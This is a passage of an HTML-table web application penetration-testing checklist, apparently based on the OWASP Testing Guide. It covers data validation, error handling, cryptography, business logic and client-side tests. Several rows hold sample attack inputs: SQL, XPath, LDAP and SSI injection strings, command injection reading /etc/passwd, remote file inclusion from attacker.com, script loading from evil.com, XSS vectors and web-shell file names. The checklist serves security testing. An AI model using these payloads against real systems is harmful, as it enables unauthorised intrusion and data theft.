		<td align="left" valign=bottom><i><font color="#808080">The application uses the same session variable for more than one purpose. An attacker can potentially access pages in an order unanticipated by the developers so that the session variable is set in one context and then used in another.</font></i></td>
		<td align="left" valign=middle><i><font color="#808080">Burp Proxy, ZAP</font></i></td>
		<td align="center" valign=middle bgcolor="#C6D9F1"><font face="Calibri" color="#000000">Not Started</font></td>
		<td align="left" valign=middle><br></td>
	</tr>
	<tr>
		<td height="17" align="left" valign=middle><br></td>
		<td align="left" valign=middle><br></td>
		<td align="left" valign=bottom><i><font color="#808080"><br></font></i></td>
		<td align="left" valign=middle><i><font color="#808080"><br></font></i></td>
		<td align="left" valign=bottom><i><font color="#808080"><br></font></i></td>
		<td align="left" valign=middle><br></td>
	</tr>
	<tr>
		<td height="19" align="left" valign=middle bgcolor="#8EB4E3"><b>Data Validation Testing</b></td>
		<td align="center" valign=middle bgcolor="#8EB4E3"><b>Test Name</b></td>
		<td align="center" valign=middle bgcolor="#8EB4E3"><b>Description</b></td>
		<td align="center" valign=middle bgcolor="#8EB4E3"><b>Tools</b></td>
		<td align="center" valign=middle bgcolor="#8EB4E3"><b>Result</b></td>
		<td align="center" valign=middle bgcolor="#8EB4E3"><b>Remark</b></td>
	</tr>
	<tr>
		<td height="35" align="left" valign=middle>OTG-INPVAL-001</td>
		<td align="left" valign=middle>Testing for Reflected Cross Site Scripting</td>
		<td align="left" valign=bottom><i><font color="#808080">Check for input validation, Replace the vector used to identify XSS, XSS with HTTP Parameter Pollution.</font></i></td>
		<td align="left" valign=middle><i><font color="#808080">Burp Proxy, ZAP, Xenotix XSS</font></i></td>
		<td align="center" valign=middle bgcolor="#C6D9F1"><font face="Calibri" color="#000000">Not Started</font></td>
		<td align="left" valign=bottom><br></td>
	</tr>
	<tr>
		<td height="37" align="left" valign=middle>OTG-INPVAL-002</td>
		<td align="left" valign=middle>Testing for Stored Cross Site Scripting</td>
		<td align="left" valign=bottom><i><font color="#808080">Check input forms/Upload forms and analyze HTML codes, Leverage XSS with BeEF</font></i></td>
		<td align="left" valign=middle><i><font color="#808080">Burp Proxy, ZAP, BeEF, XSS Proxy</font></i></td>
		<td align="center" valign=middle bgcolor="#C6D9F1"><font face="Calibri" color="#000000">Not Started</font></td>
		<td align="left" valign=bottom><br></td>
	</tr>
	<tr>
		<td height="35" align="left" valign=middle>OTG-INPVAL-003</td>
		<td align="left" valign=middle>Testing for HTTP Verb Tampering</td>
		<td align="left" valign=bottom><i><font color="#808080">Craft custom HTTP requests to test the other methods to bypass URL authentication and authorization.</font></i></td>
		<td align="left" valign=middle><i><font color="#808080">netcat</font></i></td>
		<td align="center" valign=middle bgcolor="#C6D9F1"><font face="Calibri" color="#000000">Not Started</font></td>
		<td align="left" valign=middle><br></td>
	</tr>
	<tr>
		<td height="37" align="left" valign=middle>OTG-INPVAL-004</td>
		<td align="left" valign=middle>Testing for HTTP Parameter pollution</td>
		<td align="left" valign=bottom><i><font color="#808080">Identify any form or action that allows user-supplied input to bypass Input validation and filters using HPP</font></i></td>
		<td align="left" valign=middle><i><font color="#808080">ZAP, HPP Finder (Chrome Plugin)</font></i></td>
		<td align="center" valign=middle bgcolor="#C6D9F1"><font face="Calibri" color="#000000">Not Started</font></td>
		<td align="left" valign=bottom><br></td>
	</tr>
	<tr>
		<td height="56" align="left" valign=middle>OTG-INPVAL-005</td>
		<td align="left" valign=middle>Testing for SQL Injection</td>
		<td align="left" valign=bottom><i><font color="#808080">Union, Boolean, Error based, Out-of-band, Time delay.</font></i></td>
		<td align="left" valign=middle><i><font color="#808080">Burp Proxy (SQLipy), SQLMap, Pangolin, Seclists (FuzzDB)</font></i></td>
		<td align="center" valign=middle bgcolor="#C6D9F1"><font face="Calibri" color="#000000">Not Started</font></td>
		<td align="left" valign=bottom><br></td>
	</tr>
	<tr>
		<td height="35" align="left" valign=middle><br></td>
		<td align="left" valign=middle>Oracle Testing</td>
		<td align="left" valign=bottom><i><font color="#808080">Identify URLs for PL/SQL web applications, Access with PL/SQL Packages, Bypass PL/SQL Exclusion list, SQL Injection</font></i></td>
		<td align="left" valign=middle><i><font color="#808080">Orascan, SQLInjector</font></i></td>
		<td align="center" valign=middle bgcolor="#C6D9F1"><font face="Calibri" color="#000000">Not Started</font></td>
		<td align="left" valign=bottom><br></td>
	</tr>
	<tr>
		<td height="37" align="left" valign=middle><br></td>
		<td align="left" valign=middle>MySQL Testing</td>
		<td align="left" valign=bottom><i><font color="#808080">Identify MySQL version, Single quote, Information_schema, Read/Write file.</font></i></td>
		<td align="left" valign=middle><i><font color="#808080">SQLMap, Mysqloit, Power Injector</font></i></td>
		<td align="center" valign=middle bgcolor="#C6D9F1"><font face="Calibri" color="#000000">Not Started</font></td>
		<td align="left" valign=bottom><br></td>
	</tr>
	<tr>
		<td height="37" align="left" valign=middle><br></td>
		<td align="left" valign=middle>SQL Server Testing</td>
		<td align="left" valign=bottom><i><font color="#808080">Comment operator (- -), Query separator (;), Stored procedures (xp_cmdshell)</font></i></td>
		<td align="left" valign=middle><i><font color="#808080">SQLMap, SQLninja, Power Injector</font></i></td>
		<td align="center" valign=middle bgcolor="#C6D9F1"><font face="Calibri" color="#000000">Not Started</font></td>
		<td align="left" valign=bottom><br></td>
	</tr>
	<tr>
		<td height="35" align="left" valign=middle><br></td>
		<td align="left" valign=middle>Testing PostgreSQL</td>
		<td align="left" valign=bottom><i><font color="#808080">Determine that the backend database engine is PostgreSQL by using the :: cast operator. Read/Write file, Shell Injection (OS command)</font></i></td>
		<td align="left" valign=middle><i><font color="#808080">SQLMap</font></i></td>
		<td align="center" valign=middle bgcolor="#C6D9F1"><font face="Calibri" color="#000000">Not Started</font></td>
		<td align="left" valign=middle><br></td>
	</tr>
	<tr>
		<td height="35" align="left" valign=middle><br></td>
		<td align="left" valign=middle>MS Access Testing</td>
		<td align="left" valign=bottom><i><font color="#808080">Enumerate the column through error-based (Group by), Obtain database schema combine with fuzzdb.</font></i></td>
		<td align="left" valign=middle><i><font color="#808080">SQLMap</font></i></td>
		<td align="center" valign=middle bgcolor="#C6D9F1"><font face="Calibri" color="#000000">Not Started</font></td>
		<td align="left" valign=bottom><br></td>
	</tr>
	<tr>
		<td height="35" align="left" valign=middle><br></td>
		<td align="left" valign=middle>Testing for NoSQL injection</td>
		<td align="left" valign=bottom><i><font color="#808080">Identify NoSQL databases, Pass special characters (' &quot; \ ; { } ), Attack with reserved variable name, operator.</font></i></td>
		<td align="left" valign=middle><i><font color="#808080">NoSQLMap</font></i></td>
		<td align="center" valign=middle bgcolor="#C6D9F1"><font face="Calibri" color="#000000">Not Started</font></td>
		<td align="left" valign=bottom><br></td>
	</tr>
	<tr>
		<td height="52" align="left" valign=middle>OTG-INPVAL-006</td>
		<td align="left" valign=middle>Testing for LDAP Injection</td>
		<td align="left" valign=bottom><i><font color="#808080">/ldapsearch?user=*<br>user=*user=*)(uid=*))(|(uid=*<br>pass=password</font></i></td>
		<td align="left" valign=middle><i><font color="#808080">Burp Proxy, ZAP</font></i></td>
		<td align="center" valign=middle bgcolor="#C6D9F1"><font face="Calibri" color="#000000">Not Started</font></td>
		<td align="left" valign=bottom><br></td>
	</tr>
	<tr>
		<td height="20" align="left" valign=middle>OTG-INPVAL-007</td>
		<td align="left" valign=middle>Testing for ORM Injection</td>
		<td align="left" valign=bottom><i><font color="#808080">Testing ORM injection is identical to SQL injection testing</font></i></td>
		<td align="left" valign=middle><i><font color="#808080">Hibernate, Nhibernate</font></i></td>
		<td align="center" valign=middle bgcolor="#C6D9F1"><font face="Calibri" color="#000000">Not Started</font></td>
		<td align="left" valign=bottom><br></td>
	</tr>
	<tr>
		<td height="37" align="left" valign=middle>OTG-INPVAL-008</td>
		<td align="left" valign=middle>Testing for XML Injection</td>
		<td align="left" valign=bottom><i><font color="#808080">Check with XML Meta Characters<br>', &quot; , &lt;&gt;, &lt;!--/--&gt;, &amp;, &lt;![CDATA[ / ]]&gt;, XXE, TAG</font></i></td>
		<td align="left" valign=middle><i><font color="#808080">Burp Proxy, ZAP, Wfuzz</font></i></td>
		<td align="center" valign=middle bgcolor="#C6D9F1"><font face="Calibri" color="#000000">Not Started</font></td>
		<td align="left" valign=bottom><br></td>
	</tr>
	<tr>
		<td height="75" align="left" valign=middle>OTG-INPVAL-009</td>
		<td align="left" valign=middle>Testing for SSI Injection</td>
		<td align="left" valign=bottom><i><font color="#808080">• Presense of .shtml extension<br>• Check for these characters<br>&lt; ! # = / . &quot; - &gt; and [a-zA-Z0-9]<br>• include String = &lt;!--#include virtual=&quot;/etc/passwd&quot; --&gt;</font></i></td>
		<td align="left" valign=middle><i><font color="#808080">Burp Proxy, ZAP</font></i></td>
		<td align="center" valign=middle bgcolor="#C6D9F1"><font face="Calibri" color="#000000">Not Started</font></td>
		<td align="left" valign=bottom><br></td>
	</tr>
	<tr>
		<td height="53" align="left" valign=middle>OTG-INPVAL-010</td>
		<td align="left" valign=middle>Testing for XPath Injection</td>
		<td align="left" valign=bottom><i><font color="#808080">Check for XML error enumeration by supplying a single quote (')<br>Username: ‘ or ‘1’ = ‘1<br>Password: ‘ or ‘1’ = ‘1</font></i></td>
		<td align="left" valign=middle><i><font color="#808080">Burp Proxy, ZAP</font></i></td>
		<td align="center" valign=middle bgcolor="#C6D9F1"><font face="Calibri" color="#000000">Not Started</font></td>
		<td align="left" valign=bottom><br></td>
	</tr>
	<tr>
		<td height="93" align="left" valign=middle>OTG-INPVAL-011</td>
		<td align="left" valign=middle>IMAP/SMTP Injection</td>
		<td align="left" valign=bottom><i><font color="#808080">• Identifying vulnerable parameters with special characters<br>(i.e.: \, ‘, “, @, #, !, |)<br>• Understanding the data flow and deployment structure of the client<br>• IMAP/SMTP command injection (Header, Body, Footer)</font></i></td>
		<td align="left" valign=middle><i><font color="#808080">Burp Proxy, ZAP</font></i></td>
		<td align="center" valign=middle bgcolor="#C6D9F1"><font face="Calibri" color="#000000">Not Started</font></td>
		<td align="left" valign=bottom><br></td>
	</tr>
	<tr>
		<td height="37" align="left" valign=middle>OTG-INPVAL-012</td>
		<td align="left" valign=middle>Testing for Code Injection</td>
		<td align="left" valign=bottom><i><font color="#808080">Enter OS commands in the input field.<br>?arg=1; system('id')</font></i></td>
		<td align="left" valign=middle><i><font color="#808080">Burp Proxy, ZAP, Liffy, Panoptic</font></i></td>
		<td align="center" valign=middle bgcolor="#C6D9F1"><font face="Calibri" color="#000000">Not Started</font></td>
		<td align="left" valign=bottom><br></td>
	</tr>
	<tr>
		<td height="35" align="left" valign=middle><br></td>
		<td align="left" valign=middle>Testing for Local File Inclusion</td>
		<td align="left" valign=bottom><i><font color="#808080">LFI with dot-dot-slash (../../), PHP Wrapper (php://filter/convert.base64-encode/resource)</font></i></td>
		<td align="left" valign=middle><i><font color="#808080">Burp Proxy, fimap, Liffy</font></i></td>
		<td align="center" valign=middle bgcolor="#C6D9F1"><font face="Calibri" color="#000000">Not Started</font></td>
		<td align="left" valign=bottom><br></td>
	</tr>
	<tr>
		<td height="35" align="left" valign=middle><br></td>
		<td align="left" valign=middle>Testing for Remote File Inclusion</td>
		<td align="left" valign=bottom><i><font color="#808080">RFI from malicious URL<br>?page.php?file=http://attacker.com/malicious_page</font></i></td>
		<td align="left" valign=middle><i><font color="#808080">Burp Proxy, fimap, Liffy</font></i></td>
		<td align="center" valign=middle bgcolor="#C6D9F1"><font face="Calibri" color="#000000">Not Started</font></td>
		<td align="left" valign=bottom><br></td>
	</tr>
	<tr>
		<td height="75" align="left" valign=middle>OTG-INPVAL-013</td>
		<td align="left" valign=middle>Testing for Command Injection</td>
		<td align="left" valign=bottom><i><font color="#808080">Understand the application platform, OS, folder structure, relative path and execute OS commands on a Web server.<br>%3Bcat%20/etc/passwd<br>test.pdf+|+Dir C:\</font></i></td>
		<td align="left" valign=middle><i><font color="#808080">Burp Proxy, ZAP, Commix</font></i></td>
		<td align="center" valign=middle bgcolor="#C6D9F1"><font face="Calibri" color="#000000">Not Started</font></td>
		<td align="left" valign=bottom><br></td>
	</tr>
	<tr>
		<td height="56" align="left" valign=middle>OTG-INPVAL-014</td>
		<td align="left" valign=middle>Testing for Buffer overflow</td>
		<td align="left" valign=bottom><i><font color="#808080">• Testing for heap overflow vulnerability<br>• Testing for stack overflow vulnerability<br>• Testing for format string vulnerability</font></i></td>
		<td align="left" valign=middle><i><font color="#808080">Immunity Canvas, Spike, MSF, Nessus</font></i></td>
		<td align="center" valign=middle bgcolor="#C6D9F1"><font face="Calibri" color="#000000">Not Started</font></td>
		<td align="left" valign=bottom><br></td>
	</tr>
	<tr>
		<td height="20" align="left" valign=middle><br></td>
		<td align="left" valign=middle>Testing for Heap overflow</td>
		<td align="left" valign=bottom><i><font color="#808080"><br></font></i></td>
		<td align="left" valign=middle><i><font color="#808080"><br></font></i></td>
		<td align="center" valign=middle bgcolor="#C6D9F1"><font face="Calibri" color="#000000">Not Started</font></td>
		<td align="left" valign=bottom><br></td>
	</tr>
	<tr>
		<td height="20" align="left" valign=middle><br></td>
		<td align="left" valign=middle>Testing for Stack overflow</td>
		<td align="left" valign=bottom><i><font color="#808080"><br></font></i></td>
		<td align="left" valign=middle><i><font color="#808080"><br></font></i></td>
		<td align="center" valign=middle bgcolor="#C6D9F1"><font face="Calibri" color="#000000">Not Started</font></td>
		<td align="left" valign=bottom><br></td>
	</tr>
	<tr>
		<td height="20" align="left" valign=middle><br></td>
		<td align="left" valign=middle>Testing for Format string</td>
		<td align="left" valign=bottom><i><font color="#808080"><br></font></i></td>
		<td align="left" valign=middle><i><font color="#808080"><br></font></i></td>
		<td align="center" valign=middle bgcolor="#C6D9F1"><font face="Calibri" color="#000000">Not Started</font></td>
		<td align="left" valign=bottom><br></td>
	</tr>
	<tr>
		<td height="37" align="left" valign=middle>OTG-INPVAL-015</td>
		<td align="left" valign=middle>Testing for incubated vulnerabilities</td>
		<td align="left" valign=bottom><i><font color="#808080">File Upload, Stored XSS , SQL/XPATH Injection, Misconfigured servers (Tomcat, Plesk, Cpanel)</font></i></td>
		<td align="left" valign=middle><i><font color="#808080">Burp Proxy, BeEF, MSF</font></i></td>
		<td align="center" valign=middle bgcolor="#C6D9F1"><font face="Calibri" color="#000000">Not Started</font></td>
		<td align="left" valign=bottom><br></td>
	</tr>
	<tr>
		<td height="93" align="left" valign=middle>OTG-INPVAL-016</td>
		<td align="left" valign=middle>Testing for HTTP Splitting/Smuggling</td>
		<td align="left" valign=bottom><i><font color="#808080">param=foobar%0d%0aContent-Length:%200%0d%0a%0d%0aHTTP/1.1%20200%20OK%0d%0aContent-Type:%20text/html%0d%0aContent-Length:%2035%0d%0a%0d%0a&lt;html&gt;Sorry,%20System%20Down&lt;/html&gt;</font></i></td>
		<td align="left" valign=middle><i><font color="#808080">Burp Proxy, ZAP, netcat</font></i></td>
		<td align="center" valign=middle bgcolor="#C6D9F1"><font face="Calibri" color="#000000">Not Started</font></td>
		<td align="left" valign=bottom><br></td>
	</tr>
	<tr>
		<td height="17" align="left" valign=middle><br></td>
		<td align="left" valign=middle><br></td>
		<td align="left" valign=bottom><i><font color="#808080"><br></font></i></td>
		<td align="left" valign=middle><i><font color="#808080"><br></font></i></td>
		<td align="left" valign=bottom><i><font color="#808080"><br></font></i></td>
		<td align="left" valign=bottom><br></td>
	</tr>
	<tr>
		<td height="19" align="left" valign=middle bgcolor="#8EB4E3"><b>Error Handling</b></td>
		<td align="center" valign=middle bgcolor="#8EB4E3"><b>Test Name</b></td>
		<td align="center" valign=middle bgcolor="#8EB4E3"><b>Description</b></td>
		<td align="center" valign=middle bgcolor="#8EB4E3"><b>Tools</b></td>
		<td align="center" valign=middle bgcolor="#8EB4E3"><b>Result</b></td>
		<td align="center" valign=middle bgcolor="#8EB4E3"><b>Remark</b></td>
	</tr>
	<tr>
		<td height="52" align="left" valign=middle>OTG-ERR-001</td>
		<td align="left" valign=middle>Analysis of Error Codes</td>
		<td align="left" valign=bottom><i><font color="#808080">Locate error codes generated from applications or web servers. Collect sensitive information from that errors (Web Server, Application Server, Database)</font></i></td>
		<td align="left" valign=middle><i><font color="#808080">Burp Proxy, ZAP</font></i></td>
		<td align="center" valign=middle bgcolor="#C6D9F1"><font face="Calibri" color="#000000">Not Started</font></td>
		<td align="left" valign=bottom><br></td>
	</tr>
	<tr>
		<td height="83" align="left" valign=middle>OTG-ERR-002</td>
		<td align="left" valign=middle>Analysis of Stack Traces</td>
		<td align="left" valign=bottom><i><font color="#808080">• Invalid Input / Empty inputs<br>• Input that contains non alphanumeric characters or query syn<br>tax<br>• Access to internal pages without authentication<br>• Bypassing application flow</font></i></td>
		<td align="left" valign=middle><i><font color="#808080">Burp Proxy, ZAP</font></i></td>
		<td align="center" valign=middle bgcolor="#C6D9F1"><font face="Calibri" color="#000000">Not Started</font></td>
		<td align="left" valign=bottom><br></td>
	</tr>
	<tr>
		<td height="17" align="left" valign=middle><br></td>
		<td align="left" valign=middle><br></td>
		<td align="left" valign=bottom><i><font color="#808080"><br></font></i></td>
		<td align="left" valign=middle><i><font color="#808080"><br></font></i></td>
		<td align="left" valign=bottom><i><font color="#808080"><br></font></i></td>
		<td align="left" valign=bottom><br></td>
	</tr>
	<tr>
		<td height="19" align="left" valign=middle bgcolor="#8EB4E3"><b>Cryptography</b></td>
		<td align="center" valign=middle bgcolor="#8EB4E3"><b>Test Name</b></td>
		<td align="center" valign=middle bgcolor="#8EB4E3"><b>Description</b></td>
		<td align="center" valign=middle bgcolor="#8EB4E3"><b>Tools</b></td>
		<td align="center" valign=middle bgcolor="#8EB4E3"><b>Result</b></td>
		<td align="center" valign=middle bgcolor="#8EB4E3"><b>Remark</b></td>
	</tr>
	<tr>
		<td height="37" align="left" valign=middle>OTG-CRYPST-001</td>
		<td align="left" valign=middle>Testing for Weak SSL/TSL Ciphers, Insufficient Transport Layer Protection</td>
		<td align="left" valign=bottom><i><font color="#808080">Identify SSL service, Idectify weak ciphers/protocols (ie. RC4, BEAST, CRIME, POODLE)</font></i></td>
		<td align="left" valign=middle><i><font color="#808080">testssl.sh, SSL Breacher</font></i></td>
		<td align="center" valign=middle bgcolor="#C6D9F1"><font face="Calibri" color="#000000">Not Started</font></td>
		<td align="left" valign=bottom><br></td>
	</tr>
	<tr>
		<td height="82" align="left" valign=middle>OTG-CRYPST-002</td>
		<td align="left" valign=middle>Testing for Padding Oracle</td>
		<td align="left" valign=bottom><i><font color="#808080">Compare the responses in three different states:<br>• Cipher text gets decrypted, resulting data is correct.<br>• Cipher text gets decrypted, resulting data is garbled and causes<br>some exception or error handling in the application logic.<br>• Cipher text decryption fails due to padding errors.</font></i></td>
		<td align="left" valign=middle><i><font color="#808080">PadBuster, Poracle, python-paddingoracle, POET</font></i></td>
		<td align="center" valign=middle bgcolor="#C6D9F1"><font face="Calibri" color="#000000">Not Started</font></td>
		<td align="left" valign=bottom><br></td>
	</tr>
	<tr>
		<td height="87" align="left" valign=middle>OTG-CRYPST-003</td>
		<td align="left" valign=middle>Testing for Sensitive information sent via unencrypted channels</td>
		<td align="left" valign=bottom><i><font color="#808080">Check sensitive data during the transmission:<br>• Information used in authentication (e.g. Credentials, PINs, Session<br>identifiers, Tokens, Cookies…)<br>• Information protected by laws, regulations or specific organizational<br>policy (e.g. Credit Cards, Customers data)</font></i></td>
		<td align="left" valign=middle><i><font color="#808080">Burp Proxy, ZAP, Curl</font></i></td>
		<td align="center" valign=middle bgcolor="#C6D9F1"><font face="Calibri" color="#000000">Not Started</font></td>
		<td align="left" valign=bottom><br></td>
	</tr>
	<tr>
		<td height="17" align="left" valign=middle><br></td>
		<td align="left" valign=middle><br></td>
		<td align="left" valign=bottom><i><font color="#808080"><br></font></i></td>
		<td align="left" valign=middle><i><font color="#808080"><br></font></i></td>
		<td align="left" valign=bottom><i><font color="#808080"><br></font></i></td>
		<td align="left" valign=bottom><br></td>
	</tr>
	<tr>
		<td height="19" align="left" valign=middle bgcolor="#8EB4E3"><b>Business logic Testing</b></td>
		<td align="center" valign=middle bgcolor="#8EB4E3"><b>Test Name</b></td>
		<td align="center" valign=middle bgcolor="#8EB4E3"><b>Description</b></td>
		<td align="center" valign=middle bgcolor="#8EB4E3"><b>Tools</b></td>
		<td align="center" valign=middle bgcolor="#8EB4E3"><b>Result</b></td>
		<td align="center" valign=middle bgcolor="#8EB4E3"><b>Remark</b></td>
	</tr>
	<tr>
		<td height="69" align="left" valign=middle>OTG-BUSLOGIC-001</td>
		<td align="left" valign=middle>Test Business Logic Data Validation</td>
		<td align="left" valign=bottom><i><font color="#808080">• Looking for data entry points or hand off points between systems or software.<br>• Once found try to insert logically invalid data into the application/system. </font></i></td>
		<td align="left" valign=middle><i><font color="#808080">Burp Proxy, ZAP</font></i></td>
		<td align="center" valign=middle bgcolor="#C6D9F1"><font face="Calibri" color="#000000">Not Started</font></td>
		<td align="left" valign=bottom><br></td>
	</tr>
	<tr>
		<td height="65" align="left" valign=middle>OTG-BUSLOGIC-002</td>
		<td align="left" valign=middle>Test Ability to Forge Requests</td>
		<td align="left" valign=bottom><i><font color="#808080">• Looking for guessable, predictable or hidden functionality of fields.<br>• Once found try to insert logically valid data into the application/system allowing the user go through the application/system against the normal busineess logic workflow. </font></i></td>
		<td align="left" valign=middle><i><font color="#808080">Burp Proxy, ZAP</font></i></td>
		<td align="center" valign=middle bgcolor="#C6D9F1"><font face="Calibri" color="#000000">Not Started</font></td>
		<td align="left" valign=bottom><br></td>
	</tr>
	<tr>
		<td height="191" align="left" valign=middle>OTG-BUSLOGIC-003</td>
		<td align="left" valign=middle>Test Integrity Checks</td>
		<td align="left" valign=bottom><i><font color="#808080">•Looking for parts of the application/system (components i.e. For example, input fields, databases or logs) that move, store or handle data/information.<br>• For each identified component determine what type of data/information is logically acceptable and what types the application/system should guard against. Also, consider who according to the business logic is allowed to insert, update and delete data/information and in each component.<br>• Attempt to insert, update or edit delete the data/information values with invalid data/information into each component (i.e. input, database, or log) by users that .should not be allowed per the busines logic workflow. </font></i></td>
		<td align="left" valign=middle><i><font color="#808080">Burp Proxy, ZAP</font></i></td>
		<td align="center" valign=middle bgcolor="#C6D9F1"><font face="Calibri" color="#000000">Not Started</font></td>
		<td align="left" valign=middle><br></td>
	</tr>
	<tr>
		<td height="121" align="left" valign=middle>OTG-BUSLOGIC-004</td>
		<td align="left" valign=middle>Test for Process Timing</td>
		<td align="left" valign=bottom><i><font color="#808080">• Looking for application/system functionality that may<br>be impacted by time. Such as execution time or actions that<br>help users predict a future outcome or allow one to circumvent<br>any part of the business logic or workflow. For example, not<br>completing transactions in an expected time.<br>• Develop and execute the mis-use cases ensuring that attackers<br>can not gain an advantage based on any timing.</font></i></td>
		<td align="left" valign=middle><i><font color="#808080">Burp Proxy, ZAP</font></i></td>
		<td align="center" valign=middle bgcolor="#C6D9F1"><font face="Calibri" color="#000000">Not Started</font></td>
		<td align="left" valign=middle><br></td>
	</tr>
	<tr>
		<td height="121" align="left" valign=middle>OTG-BUSLOGIC-005</td>
		<td align="left" valign=middle>Test Number of Times a Function Can be Used Limits</td>
		<td align="left" valign=bottom><i><font color="#808080">• Looking for functions or features in the application or system that should not be executed more that a single time or specified number of times during the business logic workflow.<br>• For each of the functions and features found that should only be executed a single time or specified number of times during the business logic workflow, develop abuse/misuse cases that may allow a user to execute more than the allowable number of times.</font></i></td>
		<td align="left" valign=middle><i><font color="#808080">Burp Proxy, ZAP</font></i></td>
		<td align="center" valign=middle bgcolor="#C6D9F1"><font face="Calibri" color="#000000">Not Started</font></td>
		<td align="left" valign=middle><br></td>
	</tr>
	<tr>
		<td height="87" align="left" valign=middle>OTG-BUSLOGIC-006</td>
		<td align="left" valign=middle>Testing for the Circumvention of Work Flows</td>
		<td align="left" valign=bottom><i><font color="#808080">• Looking for methods to skip or go to steps in the application process in a different order from the designed/intended business logic flow.<br>• For each method develop a misuse case and try to circumvent or perform an action that is &quot;not acceptable&quot; per the the business logic workflow. </font></i></td>
		<td align="left" valign=middle><i><font color="#808080">Burp Proxy, ZAP</font></i></td>
		<td align="center" valign=middle bgcolor="#C6D9F1"><font face="Calibri" color="#000000">Not Started</font></td>
		<td align="left" valign=middle><br></td>
	</tr>
	<tr>
		<td height="69" align="left" valign=middle>OTG-BUSLOGIC-007</td>
		<td align="left" valign=middle>Test Defenses Against Application Mis-use</td>
		<td align="left" valign=bottom><i><font color="#808080">Measures that might indicate the application has in-built self-defense:<br>• Changed responses<br>• Blocked requests<br>• Actions that log a user out or lock their account</font></i></td>
		<td align="left" valign=middle><i><font color="#808080">Burp Proxy, ZAP</font></i></td>
		<td align="center" valign=middle bgcolor="#C6D9F1"><font face="Calibri" color="#000000">Not Started</font></td>
		<td align="left" valign=middle><br></td>
	</tr>
	<tr>
		<td height="139" align="left" valign=middle>OTG-BUSLOGIC-008</td>
		<td align="left" valign=middle>Test Upload of Unexpected File Types</td>
		<td align="left" valign=bottom><i><font color="#808080">• Review the project documentation and perform some exploratory testing looking for file types that should be &quot;unsupported&quot; by the application/system.<br>• Try to upload these “unsupported” files an verify that it are properly rejected.<br>• If multiple files can be uploaded at once, there must be tests in place to verify that each file is properly evaluated. <br>PS. file.phtml, shell.phPWND, SHELL~1.PHP</font></i></td>
		<td align="left" valign=middle><i><font color="#808080">Burp Proxy, ZAP</font></i></td>
		<td align="center" valign=middle bgcolor="#C6D9F1"><font face="Calibri" color="#000000">Not Started</font></td>
		<td align="left" valign=middle><br></td>
	</tr>
	<tr>
		<td height="87" align="left" valign=middle>OTG-BUSLOGIC-009</td>
		<td align="left" valign=middle>Test Upload of Malicious Files</td>
		<td align="left" valign=bottom><i><font color="#808080">• Develop or acquire a known “malicious” file.<br>• Try to upload the malicious file to the application/system and verify that it is correctly rejected.<br>• If multiple files can be uploaded at once, there must be tests in place to verify that each file is properly evaluated. </font></i></td>
		<td align="left" valign=middle><i><font color="#808080">Burp Proxy, ZAP</font></i></td>
		<td align="center" valign=middle bgcolor="#C6D9F1"><font face="Calibri" color="#000000">Not Started</font></td>
		<td align="left" valign=middle><br></td>
	</tr>
	<tr>
		<td height="17" align="left" valign=middle><br></td>
		<td align="left" valign=middle><br></td>
		<td align="left" valign=bottom><i><font color="#808080"><br></font></i></td>
		<td align="left" valign=middle><br></td>
		<td align="left" valign=bottom><i><font color="#808080"><br></font></i></td>
		<td align="left" valign=middle><br></td>
	</tr>
	<tr>
		<td height="19" align="left" valign=middle bgcolor="#8EB4E3"><b>Client Side Testing</b></td>
		<td align="center" valign=middle bgcolor="#8EB4E3"><b>Test Name</b></td>
		<td align="center" valign=middle bgcolor="#8EB4E3"><b>Description</b></td>
		<td align="center" valign=middle bgcolor="#8EB4E3"><b>Tools</b></td>
		<td align="center" valign=middle bgcolor="#8EB4E3"><b>Result</b></td>
		<td align="center" valign=middle bgcolor="#8EB4E3"><b>Remark</b></td>
	</tr>
	<tr>
		<td height="23" align="left" valign=middle>OTG-CLIENT-001</td>
		<td align="left" valign=middle>Testing for DOM based Cross Site Scripting</td>
		<td align="left" valign=bottom><i><font color="#808080">Test for the user inputs obtained from client-side JavaScript Objects</font></i></td>
		<td align="left" valign=middle><i><font color="#808080">Burp Proxy, DOMinator</font></i></td>
		<td align="center" valign=middle bgcolor="#C6D9F1"><font face="Calibri" color="#000000">Not Started</font></td>
		<td align="left" valign=bottom><br></td>
	</tr>
	<tr>
		<td height="35" align="left" valign=middle>OTG-CLIENT-002</td>
		<td align="left" valign=middle>Testing for JavaScript Execution</td>
		<td align="left" valign=bottom><i><font color="#808080">Inject JavaScript code:<br>www.victim.com/?javascript:alert(1)</font></i></td>
		<td align="left" valign=middle><i><font color="#808080">Burp Proxy, ZAP</font></i></td>
		<td align="center" valign=middle bgcolor="#C6D9F1"><font face="Calibri" color="#000000">Not Started</font></td>
		<td align="left" valign=bottom><br></td>
	</tr>
	<tr>
		<td height="35" align="left" valign=middle>OTG-CLIENT-003</td>
		<td align="left" valign=middle>Testing for HTML Injection</td>
		<td align="left" valign=bottom><i><font color="#808080">Send malicious HTML code:<br>?user=&lt;img%20src='aaa'%20onerror=alert(1)&gt;</font></i></td>
		<td align="left" valign=middle><i><font color="#808080">Burp Proxy, ZAP</font></i></td>
		<td align="center" valign=middle bgcolor="#C6D9F1"><font face="Calibri" color="#000000">Not Started</font></td>
		<td align="left" valign=middle><br></td>
	</tr>
	<tr>
		<td height="35" align="left" valign=middle>OTG-CLIENT-004</td>
		<td align="left" valign=middle>Testing for Client Side URL Redirect</td>
		<td align="left" valign=bottom><i><font color="#808080">Modify untrusted URL input to a malicious site: (Open Redirect)<br>?redirect=www.fake-target.site </font></i></td>
		<td align="left" valign=middle><i><font color="#808080">Burp Proxy, ZAP</font></i></td>
		<td align="center" valign=middle bgcolor="#C6D9F1"><font face="Calibri" color="#000000">Not Started</font></td>
		<td align="left" valign=middle><br></td>
	</tr>
	<tr>
		<td height="69" align="left" valign=middle>OTG-CLIENT-005</td>
		<td align="left" valign=middle>Testing for CSS Injection</td>
		<td align="left" valign=bottom><i><font color="#808080">Inject code in the CSS context :<br>•  www.victim.com/#red;-o-link:'javascript:alert(1)';-o-link-source:current; (Opera [8,12])<br>•  www.victim.com/#red;-:expression(alert(URL=1)); (IE 7/8)</font></i></td>
		<td align="left" valign=middle><i><font color="#808080">Burp Proxy, ZAP</font></i></td>
		<td align="center" valign=middle bgcolor="#C6D9F1"><font face="Calibri" color="#000000">Not Started</font></td>
		<td align="left" valign=middle><br></td>
	</tr>
	<tr>
		<td height="32" align="left" valign=middle>OTG-CLIENT-006</td>
		<td align="left" valign=middle>Testing for Client Side Resource Manipulation</td>
		<td align="left" valign=bottom><i><font color="#808080">External JavaScript could be easily injected in the trusted web site<br>www.victim.com/#http://evil.com/js.js</font></i></td>
